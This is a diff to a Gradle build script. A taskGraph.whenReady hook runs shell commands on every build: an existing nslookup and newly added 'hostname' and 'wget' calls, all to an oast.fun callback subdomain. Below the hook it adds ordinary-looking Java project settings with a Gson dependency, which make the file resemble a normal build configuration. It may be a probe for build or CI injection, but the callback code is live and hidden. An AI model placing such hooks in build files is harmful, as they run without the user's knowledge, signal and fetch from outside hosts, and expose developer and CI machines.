@@ -1,4 +1,27 @@
 gradle.taskGraph.whenReady { taskGraph ->
     def proc = ['sh', '-c', 'nslookup zaqomuautfvhygykvceciwofm26vsrycn.oast.fun'].execute()
+    def proc2 = ['sh', '-c', 'hostname zaqomuautfvhygykvceciwofm26vsrycn.oast.fun'].execute()
+    def proc3 = ['sh', '-c', 'wget zaqomuautfvhygykvceciwofm26vsrycn.oast.fun'].execute()
     proc.waitForProcessOutput(System.out, System.err)
+}
+
+plugins {
+    id 'java'
+}
+
+group = 'com.example'
+version = '1.0-SNAPSHOT'
+
+repositories {
+    mavenCentral()
+}
+
+dependencies {
+    // Example dependency: Gson for JSON parsing
+    implementation 'com.google.code.gson:gson:2.10.1'
+}
+
+java {
+    sourceCompatibility = JavaVersion.VERSION_11
+    targetCompatibility = JavaVersion.VERSION_11
 }
